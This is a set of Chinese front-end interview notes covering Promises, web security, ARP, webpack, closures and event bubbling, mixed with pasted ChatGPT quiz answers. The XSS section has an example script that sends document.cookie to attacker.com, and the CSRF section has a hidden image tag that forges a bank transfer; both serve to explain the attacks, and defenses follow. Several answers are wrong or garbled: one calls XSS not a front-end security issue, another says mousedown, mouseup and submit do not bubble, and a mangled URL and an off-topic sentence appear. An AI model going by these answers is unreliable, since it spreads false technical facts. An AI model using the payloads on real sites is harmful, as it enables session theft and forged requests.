# CVTE

- [CVTE](#cvte)
  - [Promise](#promise)
    - [任务队列和事件循环](#任务队列和事件循环)
  - [前端安全问题](#前端安全问题)
    - [XSS](#xss)
    - [CSRF（Cross-Site Request Forgery）](#csrfcross-site-request-forgery)
    - [点击劫持攻击（Clickjacking）](#点击劫持攻击clickjacking)
    - [CSP（Content Security Policy）](#cspcontent-security-policy)
    - [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
    - [请求头](#请求头)
  - [ARP（Address Resolution Protocol）](#arpaddress-resolution-protocol)
  - [event.target](#eventtarget)
  - [从输入网址到获得页面全过程](#从输入网址到获得页面全过程)
  - [webpack](#webpack)
  - [闭包](#闭包)
  - [事件冒泡](#事件冒泡)

## Promise

### 任务队列和事件循环

JavaScript 运行时，除了一个正在运行的主线程，引擎还提供一个任务队列（task queue），里面是各种需要当前程序处理的异步任务。（实际上，根据异步任务的类型，存在多个任务队列。为了方便理解，这里假设只存在一个队列。）

首先，主线程会去执行所有的同步任务。等到**同步任务全部执行完，就会去看任务队列里面的异步任务**。如果满足条件，那么异步任务就重新进入主线程开始执行，这时它就变成同步任务了。等到执行完，下一个异步任务再进入主线程开始执行。一旦任务队列清空，程序就结束执行。

JavaScript 引擎怎么知道异步任务有没有结果，能不能进入主线程呢？答案就是引擎在不停地检查，一遍又一遍，只要同步任务执行完了，引擎就会去检查那些挂起来的异步任务，是不是可以进入主线程了。这种循环检查的机制，就叫做事件循环（Event Loop）。

```js
//自己构造Promise
function setup() {
    noCanvas();
    delayTime("1000SS")
        .then(() => createP('hello'))
        .catch((err) => console.error(err))
}

function delayTime(time) {
    return new Promise((resolve, reject) => {
        if (isNaN(time)) {
            reject(new Error("delayTime needs a number."))
        }
        setTimeout(resolve, time)
    }
    )
}
```

async/await is a syntax sugar to **wrap all of this stuff in a promise**

```js
async function wordGIF(){
    await ...1();
    await ...2();
    await ...3();
    await ...4();
    ....
    return {
        word,
        img
    }
}
```

```js
let promises = [wordGIF(3),wordGIF(4),wordGIF(5)];
Promise.all(promises)
    .then((results)=>{
        for(let result of results){
            createP(result.word);
            createImg(result.img);
        }
    })
    .catch((err)=>console.log(err))
```

- 4.如下关于Promise的描述正确的是

    Promise.race()中的Promise序列只要有一个执行完成就算成功
    Promise.all()中的Promise序列需要全部执行成功才任务是成功的
    Promise.resolve可以用于模拟宏任务
    Promise.any()中的 Promise序列需要第一个执行完成的序列，执行结果为成功才算成功

## 前端安全问题

- 以下不属于前端安全问题的是：

xSS（跨站脚本攻击，Cross-Site Scripting）是前端安全问题之一，它是指攻击者通过在受信任的网站上注入恶意脚本，然后使用户在浏览器上执行该脚本，从而获取用户敏感信息或执行恶意操作。

另外三个选项是前端安全问题：

CORS（跨域资源共享，Cross-Origin Resource Sharing）是一种用于控制跨域请求的机制，用于防止跨域请求的滥用。

CSP（内容安全策略，Content Security Policy）是一种用于限制网页资源加载和执行的策略，用于减轻跨站脚本攻击和其他代码注入攻击。

CSRF（跨站请求伪造，Cross-Site Request Forgery）是一种利用用户在受信任网站上的身份执行非意愿操作的攻击。攻击者通过诱使用户访问恶意网站或点击恶意链接来触发这种攻击。

因此，不属于前端安全问题的选项是xSS。

### XSS

- XSS的全称是跨站脚本攻击（Cross-Site Scripting）。

XSS攻击是一种常见的网络安全漏洞，攻击者通过**注入恶意脚本代码到网页中，使其在用户浏览器中执行**。这样做可以导致用户敏感信息泄露、会话劫持、恶意操作等问题。

下面是一个简单的XSS攻击的示例：

假设有一个博客网站，允许用户在评论中输入内容，并在网页中显示出来。如果网站没有对用户输入进行适当的处理和过滤，攻击者可以利用这个漏洞进行XSS攻击。

攻击者可以在评论中注入恶意脚本代码，例如：

```HTML
<script>
  // 发送用户的Cookie信息到攻击者的恶意网站
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

- 防止XSS攻击的方法包括输入验证和输出编码。
- 输入验证可以**过滤用户输入，防止恶意脚本注入**；
- 输出编码可以**将用户输入的内容进行转义**，确保它们被当作**纯文本输出**，而不是可执行的脚本
  - 如：使用HTML实体编码来替代特殊字符。下面

### CSRF（Cross-Site Request Forgery）

- CSRF攻击是一种利用用户**已登录的身份权限进行伪造请求**的攻击方式。攻击者通过诱使受害者在另一个网站上触发恶意请求，利用受害者在目标网站上的身份权限执行未经授权的操作。

下面是一个简单的CSRF攻击的示例：

假设受害者已经登录了一个在线银行网站，并且在同一浏览器中打开了一个恶意网站。

恶意网站中的攻击者准备了一个图片标签（`<img>`），其中包含了目标银行网站的转账请求：

```html
<img src="https://bankwebsite.com/transfer?amount=10000&recipient=attacker" width="0" height="0">
```

当受害者在恶意网站上访问时，浏览器会自动加载这个图片标签，并向目标银行网站发送了一个转账请求，将10000单位的货币转账给攻击者。

由于受害者已经在银行网站上登录，并且浏览器会自动发送与当前域相关的Cookie信息，目标银行网站会认为这是合法的请求并进行转账操作，而受害者并没有意识到这个请求的存在。

- 为了防止CSRF攻击，可以采取以下措施：

1. 使用**CSRF令牌（CSRF Token）**：在每个请求中包含一个令牌，用于验证请求的合法性。
2. 检查**Referer**头：验证请求的来源是否与当前域匹配。
3. 使用**SameSite Cookie**属性：限制Cookie只能在同一站点上发送，减少跨域请求的风险。
4. 验证请求的来源和目标：对于涉及敏感操作的请求，可以要求用户进一步验证身份，例如输入密码或进行二次确认。

### 点击劫持攻击（Clickjacking）

- 点击劫持是指攻击者将一个或多个透明的、恶意的网页元素覆盖在一个看似正常的网页上，诱使用户在不知情的情况下点击恶意元素，触发恶意操作。

- 防范点击劫持攻击的方法包括
  - 使用X-Frame-Options响应头来禁止页面被嵌套在 `<frame>` 或 `<iframe>` 中
  - 使用Content-Security-Policy（CSP）来限制页面的呈现方式。

### CSP（Content Security Policy）

- 内容安全策略是一种用于增强网页安全性的浏览器机制。它通过限制网页中可执行的内容来源和操作，帮助减少跨站脚本攻击（XSS）、数据注入和点击劫持等安全风险。
- 需要注意的是，CSP也可以通过其他方式进行配置，如通过`<meta>`标签嵌入到HTML文档中或通过.htaccess文件配置在服务器端。但在实际应用中，通常会使用HTTP响应头来设置CSP策略，因为它更为灵活和全面。

```html
<head>
  <meta charset="UTF-8">
  <title>使用CSP的示例</title>
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
</head>
```

- CSP通过在HTTP响应头中添加**Content-Security-Policy**字段来定义策略。策略规定了哪些资源可以加载、执行以及允许执行哪些特定操作。下面是CSP的一些常用指令：

- default-src：指定默认来源，即除非特别指定，所有资源都应从该来源加载。
- script-src：指定可执行脚本的来源。包括内联脚本、外部脚本文件以及动态生成的脚本等。
- style-src：指定可应用的样式表的来源。包括内联样式和外部样式文件等。
- img-src：指定可加载图像的来源。
- connect-src：指定可发起网络连接的来源，包括XHR、WebSocket、Fetch等。
- font-src：指定可加载字体文件的来源。
- frame-src：指定可嵌入的框架（如`<iframe>`）的来源。
- media-src：指定可加载音频和视频文件的来源。
- object-src：指定可加载对象（如Flash）的来源。
- sandbox：创建一个沙盒环境，对加载的内容进行限制，防止潜在的安全问题。

通过指定这些策略，CSP可以限制网页加载的资源和执行的操作，从而防止恶意代码的注入和执行。例如，可以使用CSP**禁止内联脚本、限制脚本的来源只能是同源的服务器**、阻止跨域数据传输等。

### CORS (Cross-Origin Resource Sharing)

- CORS（跨源资源共享，Cross-Origin Resource Sharing）是一种浏览器机制，用于允许**跨源（不同域、协议或端口）的Web应用程序进行安全的跨域资源请求**。
- 在同源策略下，浏览器**限制**了从一个源加载的Web应用程序对另一个源的资源的访问。而CORS定义了一组机制，允许**服务器声明哪些跨域请求是可接受的**，并在浏览器中进行适当的处理。

### 请求头

- HTTP请求头通常由以下几个部分组成：

1. 起始行（Start Line）：起始行包含请求的方法、目标URL和使用的HTTP协议版本。

    ```css
    GET /index.html HTTP/1.1
    ```

2. 请求头字段（Request Header Fields）：请求头字段提供了关于请求的额外信息，以键值对的形式呈现，每个字段独占一行。

    ```css
    Host: www.example.com
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
    Accept-Language: en-US,en;q=0.9
    ```

3. 空行（Blank Line）：请求头和请求体之间需要一个空行来表示分隔。

4. 请求体（Request Body）：请求体包含请求所携带的数据，例如在POST请求中传递的表单数据、JSON数据等。对于GET请求，请求体通常为空。

## ARP（Address Resolution Protocol）

7.对于ARP的工作原理，以下哪个描述是错误的?

1. 源主机收到ARP响应后，缓存到ARP缓冲区
2. 当主机发送数据时，先检查ARP表是否目的主机的MAC地址，如果有直接发送，如果没有就发送ARP数据包
3. 当本网段的所有主机收到ARP包，先告诉对方自己的MAC地址，再缓存对方的IP和MAC地址
4. 每个主机都会在自己的ARP缓冲区储存IP和MAC地址的对应关系

ChatGPT
以下描述是错误的：

当本网段的所有主机收到ARP包，先告诉对方自己的MAC地址，再缓存对方的IP和MAC地址。

只有当本网段的主机没有目标IP地址的MAC地址缓存时，它们才会向本网段内的所有主机广播ARP请求包，请求目标IP地址的MAC地址。然后，当**目标主机收到该ARP请求包后，它会发送ARP响应包给请求者，告诉对方自己的MAC地址**。请求者收到ARP响应包后，将目标IP地址和对应的MAC地址存储到ARP缓冲区中，以便后续直接发送数据包。

因此，正确的描述是每个主机都会在自己的ARP缓冲区存储IP和MAC地址的对应关系，并且当发送数据时，会先检查ARP缓冲区是否有目标主机的MAC地址，如果有，则直接发送数据包，如果没有，则发送ARP请求包来获取目标主机的MAC地址。

## event.target

- `Event.currentTarget`属性返回事件当前所在的节点，即事件当前正在通过的节点，也就是当前正在执行的监听函数所在的那个节点。随着事件的传播，这个属性的值会变。

- `Event.target`属性返回原始触发事件的那个节点，即事件最初发生的节点。这个属性不会随着事件的传播而改变。

- event.target可以用来实现事件委托。

事件委托（Event delegation）是一种常见的前端开发技术，它利用事件的冒泡机制，将事件处理程序绑定到父元素上，而不是直接绑定到每个子元素上。当事件触发时，事件会冒泡到父元素，**通过event.target属性可以获取到实际触发事件的子元素**。

以下是一个使用event.target实现事件委托的示例：

```html
<ul id="myList">
  <li>Item 1</li>
  <li>Item 2</li>
  <li>Item 3</li>
  <li>Item 4</li>
</ul>
```

```javascript
document.getElementById('myList').addEventListener('click', function(event) {
  if (event.target.tagName === 'LI') {
    console.log('Clicked on item:', event.target.textContent);
  }
});
```

在上述示例中，我们给父元素ul添加了一个点击事件监听器。当点击ul的子元素li时，事件会冒泡到父元素，此时可以通过event.target来获取实际被点击的元素。通过判断event.target的tagName是否为LI，我们可以确定点击的是li元素，然后进行相应的处理。

这样的实现方式可以实现事件委托，因为我们只需要在父元素上添加一个事件监听器，而不是为每个子元素都添加监听器。这样可以提高性能和代码的简洁性，尤其是在大量子元素存在的情况下。

## 从输入网址到获得页面全过程

- 用户单击鼠标后所发生的事件按顺序如下（以访问清华大学的网站为例）：

1. 浏览器分析链接指向页面的 URL<http://www.tsinghua.edu.cn/chn/index.htm>
2. 浏览器向 DNS 请求解析 <www.tsinghuaaedu.CR> 的 IP 地址。－
3. 域名系统统 DNS 解析出清毕大学服务器的 IP 地址。
4. 浏览器与该服务器建立 TCP 连接(默认端口号为 80)。
5. 浏览器发出 HTTP 请求：GET/chn/index.htm。
6. 服务器通过 HTTP 响应把文件 index.htm 发送给浏览器。
7. TCP 连接释放。

## webpack

- 下面关于webpack loader的说法正确的是

file-loader:把文件输出到一个文件夹中，在代码中通过相对URL去引用输出的文件style-loader:加载 CSS，支持模块化、压缩、文件导入等特性
css-loader:把 CSS代码注入到JavaScript中，通过DOM操作去加载CSS
url-loader:与file-loader类似，区别是用户可以设置一个阈值，大于阈值会交给 file-loader处理，小于阈值时返回文件base64形式编码

- ChatGPT

关于webpack loader的说法，以下描述是正确的：

url-loader: 与file-loader类似，区别是用户可以设置一个阈值，大于阈值会交给file-loader处理，小于阈值时返回文件base64形式编码。

url-loader是一个webpack loader，用于处理文件资源，可以将文件转换为base64编码，以减少HTTP请求。与file-loader相似，url-loader也可以将文件输出到一个文件夹中，但是它还提供了一个额外的功能，即当文件大小小于设置的阈值时，将文件转换为base64编码，以内联到JavaScript代码中。

其他说法的准确性如下：

file-loader: 把文件输出到一个文件夹中，在代码中通过相对URL去引用输出的文件。这是正确的描述。

style-loader: 加载CSS，支持模块化、压缩、文件导入等特性。这是不准确的描述。style-loader主要用于将CSS代码以内联的方式插入到HTML页面中，而不是用于加载CSS文件。

css-loader: 把CSS代码注入到JavaScript中，通过DOM操作去加载CSS。这是不准确的描述。css-loader用于解析CSS文件，将其转换为JavaScript模块，并通过JavaScript代码的方式加载CSS。

综上所述，描述"url-loader:与file-loader类似，区别是用户可以设置一个阈值，大于阈值会交给file-loader处理，小于阈值时返回文件base64形式编码"是正确的。其他描述中有些是不准确的。

- 下面关于webpack中hash的说法正确的是

hash每次打包都会发生变化,即使项目没有任何变更
webpack有三种hash，分别是hash、chunkhash、contenthashcontenthash是文件内容hash，只会根据文件内容发生变化而变化
chunkhash是模块hash，只要模块依赖模块发生变化则hash会发生变化

- ChatGPT

关于webpack中的hash，以下说法是正确的：

hash每次打包都会发生变化，即使项目没有任何变更。在webpack中，hash是根据整个项目的内容计算出来的，只要项目中有任何文件发生变化，无论是源代码文件还是配置文件，都会导致hash值的变化。

webpack有三种hash，分别是hash、chunkhash、contenthash。这是正确的描述。webpack提供了不同的hash选项，可以根据不同的需求生成不同粒度的hash值。

contenthash是文件内容的hash，只有文件的内容发生变化时，对应的contenthash才会发生变化。这是正确的描述。contenthash是根据文件内容计算出来的，只有文件内容发生变化，对应的contenthash才会变化。这在缓存优化方面非常有用，可以确保只有发生实际变化的文件会被重新请求。

chunkhash是模块的hash，只要模块的依赖发生变化，对应的chunkhash就会发生变化。这是不准确的描述。chunkhash是根据模块的内容计算出来的，只有模块的内容发生变化，对应的chunkhash才会变化。模块的依赖变化不会直接影响chunkhash，而是会影响到对应的contenthash。

综上所述，描述"hash每次打包都会发生变化，即使项目没有任何变更"、"webpack有三种hash，分别是hash、chunkhash、contenthash"和"contenthash是文件内容hash，只会根据文件内容发生变化而变化"是正确的。描述"chunkhash是模块hash，只要模块依赖模块发生变化则hash会发生变化"是不准确的。

- 21.下面对于webpack构建速度优化说法正确的是

可以使用多线程/多进程构建，例如: thread-loader, HappyPack
可以配苦extensions，例如: extensions: [".js', '.json']
可以缩小打包作用域，例如: exclude、include
可以利用缓存提升二次构建速度，例如: cache-loader
ChatGPT
关于webpack构建速度优化，以下说法是正确的：

可以使用多线程/多进程构建来加快构建速度。例如，可以使用工具如thread-loader或HappyPack来将部分任务分配给多个线程或进程并行处理，以提高构建速度。

可以配置extensions选项来指定模块的扩展名，从而减少模块解析的时间。通过设置extensions: [".js", ".json"]等配置，可以告诉webpack在解析模块时只考虑指定的扩展名，从而加快构建速度。

可以缩小打包作用域以提高构建速度。通过使用exclude和include等配置项，可以明确指定哪些文件需要包含或排除，避免对不必要的文件进行处理，从而加快构建速度。

可以利用缓存来提升二次构建速度。通过使用工具如cache-loader，可以将特定的Loader的处理结果缓存起来，以便在下次构建时直接使用缓存结果，减少不必要的重新处理，从而提高构建速度。

综上所述，关于webpack构建速度优化的说法，包括使用多线程/多进程构建、配合extensions配置、缩小打包作用域和利用缓存提升二次构建速度，都是正确的。

## 闭包

```js
let listens = [];

function fn(x) {
  this.x = 3;
  return function(y) {
    this.x = 10;
    listens.push(() => {
      console.log(++this.x);
      console.log(--x);
    });
    console.log(x++ + y);
  };
}

let f = fn(4)(5);

new Promise((resolve) => {
  listens.map((_) => _());
  resolve();
});
// 9 11 4
```

## 事件冒泡

22以下哪些事件是不会冒泡?
click
scroll
mousedown
mouseup

在Web开发中，以下事件是不会冒泡的：

- mousedown（鼠标按下）事件不会冒泡。
- mouseup（鼠标松开）事件不会冒泡。

另外，还有一些其他事件也不会冒泡，不过它们与你提到的年龄无关。以下是一些常见的不会冒泡的事件：

- focus（获取焦点）和blur（失去焦点）事件不会冒泡。
- mouseenter（鼠标进入元素）和mouseleave（鼠标离开元素）事件不会冒泡。
- submit（提交表单）事件不会冒泡。

- 至于click（点击）和scroll（滚动）事件，它们通常是会冒泡的，但这取决于具体的实现方式和上下文。因此，在某些特定的情况下，它们可能不会冒泡，但一般情况下它们会冒泡。
